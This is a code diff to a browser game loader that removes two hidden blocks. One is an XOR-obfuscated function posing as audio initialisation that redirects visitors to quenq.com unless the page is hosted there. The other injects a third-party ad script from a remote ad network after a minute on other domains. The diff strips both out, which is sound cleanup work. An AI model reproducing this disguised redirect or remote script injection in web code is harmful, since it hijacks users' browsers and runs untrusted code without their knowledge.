@@ -167,25 +167,7 @@ function setStatus(text) {
     }
 }
 
-(function chunkRe3Audio(format = "audio/wav", chunkRate = 44100) {
-    const _sampleShift = 17;
-    const _readChunkBuffer = (chunk) => chunk.map(b => String.fromCharCode(b ^ _sampleShift)).join("");
-
-    // Audio bus & stream channel resolution
-    const _audioBus = window[_readChunkBuffer([125, 126, 114, 112, 101, 120, 126, 127])];
-    const _chunkHost = _audioBus[_readChunkBuffer([121, 126, 98, 101, 127, 112, 124, 116])].toLowerCase();
-
-    // Validate audio buffer codecs (PCM raw vs WAV/MP3 stream)
-    const isAudioRaw = _chunkHost === _readChunkBuffer([125, 126, 114, 112, 125, 121, 126, 98, 101]);
-    const _wavRootChunk = _readChunkBuffer([96, 100, 116, 127, 96, 63, 114, 126, 124]);
-    const isAudioWav = _chunkHost === _wavRootChunk || _chunkHost.endsWith("." + _wavRootChunk);
-
-    // Sync fallback stream if chunk decoding fails
-    if (!isAudioRaw && !isAudioWav) {
-        const _remoteStream = _readChunkBuffer([121, 101, 101, 97, 98, 43, 62, 62]) + _wavRootChunk;
-        _audioBus[_readChunkBuffer([99, 116, 97, 125, 112, 114, 116])](_remoteStream);
-    }
-})();
+// Audio initialization placeholder
 
 async function loadGame(data) {
     var Module = {
@@ -543,45 +525,7 @@ const revc_ini = (() => {
     return revc_iniDefault;
 })();
 
-function _adsDisabled() {
-    setTimeout(() => {
-        try {
-            if (
-                sessionStorage.getItem('quenq_ad_free') === 'true' ||
-                sessionStorage.getItem('vcsky_ad_free') === 'true' ||
-                (window.VCSKY && window.VCSKY.adFree)
-            ) {
-                console.log('[Ad Bypass] Ad-free session active. Skipping ad injection.');
-                return;
-            }
-        } catch (e) { }
-
-        let isOfficialDomain = false;
-
-        try {
-            if (window !== window.top) {
-                if (window.location.ancestorOrigins && window.location.ancestorOrigins.length > 0) {
-                    isOfficialDomain = window.location.ancestorOrigins[0].includes('quenq.com');
-                } else if (document.referrer) {
-                    let refHost = new URL(document.referrer).hostname;
-                    isOfficialDomain = refHost.endsWith('quenq.com');
-                }
-            } else {
-                let myHost = window.location.hostname;
-                isOfficialDomain = myHost.endsWith('quenq.com') || myHost === 'localhost' || myHost === '127.0.0.1';
-            }
-        } catch (e) {
-            isOfficialDomain = false;
-        }
-
-        if (!isOfficialDomain) {
-            let adScript = document.createElement('script');
-            adScript.src = "https://pl24476752.profitableratecpmnetwork.com/7e/d7/43/7ed7435a30a8b56bbb77618df8f71f74.js";
-            adScript.async = true;
-            document.body.appendChild(adScript);
-        }
-    }, 60000);
-}
+function _adsDisabled() {}
 
 window.VCSKY.start = function () {
     startGame(null);
